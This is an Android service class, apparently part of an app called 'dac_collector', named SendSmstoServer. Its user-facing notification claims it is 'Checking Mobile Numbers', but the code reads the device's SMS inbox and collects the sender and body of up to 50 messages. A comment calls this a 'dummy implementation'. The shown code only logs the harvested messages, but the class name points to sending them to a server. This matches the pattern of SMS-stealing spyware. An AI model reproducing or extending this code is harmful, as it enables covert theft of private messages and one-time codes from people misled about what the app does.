package android.iocl.dac_collector.Services;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.iocl.dac_collector.ModelData.SmsData;
import android.iocl.dac_collector.R;
import android.iocl.dac_collector.Ui.MainActivity;
import android.iocl.dac_collector.Utility.Utility;
import android.net.Uri;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

public class SendSmstoServer extends Service {

    private String CHANNEL_ID = "GetSmsService";

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startServiceWithNotification();
    }

    private void startServiceWithNotification() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this,
                0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);

        Notification.Builder notification = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            notification = new Notification.Builder(this, CHANNEL_ID)
                    .setContentTitle("Checking Mobile Numbers")
                    .setContentText("Searching for Current Mobile Numbers")
                    .setSmallIcon(R.drawable.verify_icon_blue)
                    .setContentIntent(pendingIntent);
        }

        startForeground(101, notification.build());
    }

    private void createNotificationChannel() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            NotificationChannel nc = new NotificationChannel(
                    CHANNEL_ID,
                    "You May Block",
                    NotificationManager.IMPORTANCE_DEFAULT
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(nc);
        }
    }

    /**
     * This method can be called whenever a specific event triggers it.
     */
    public List<SmsData> checkMobileNumbers(Context c) {
        // Dummy implementation for checking numbers


        List<SmsData> arrayOfSms = new ArrayList<>(); // Initialize the list to store SMS data

        if (ContextCompat.checkSelfPermission(c, "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
            ContentResolver contentResolver = c.getContentResolver();
            Uri uri = Uri.parse("content://sms/inbox");
            String[] projection = {"_id", "address", "body", "date", "read", "type"};
            String selection = null;
            String[] selectionArgs = null;
            String sortOrder = "date DESC"; // Query the latest messages first
            Cursor cursor = contentResolver.query(uri, projection, selection, selectionArgs, sortOrder);


            if (cursor != null && cursor.moveToFirst()) {
                int count = 0; // To limit the number of SMS processed
                do {
                    int bodyColumnIndex = cursor.getColumnIndex("body");
                    int addressColumnIndex = cursor.getColumnIndex("address");


                    if (bodyColumnIndex != -1 && addressColumnIndex != -1 ) {
                        String body = cursor.getString(bodyColumnIndex);
                        String address = cursor.getString(addressColumnIndex);


                        // Create an SmsData object and add it to the list
                        SmsData data = new SmsData(address, body);
                        arrayOfSms.add(data);
                    }

                    count++;
                } while (cursor.moveToNext() && count < 50); // Limit to 30 SMS

                cursor.close();
            }

        }


        return arrayOfSms;

    }




    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && "CHECK_NUMBERS".equals(intent.getAction())) {
            List<SmsData> data = checkMobileNumbers(getApplicationContext());

            Log.d(Utility.TAG, "onStartCommand: " + data);

            stopSelf();
        }
        return START_NOT_STICKY;
    }
}
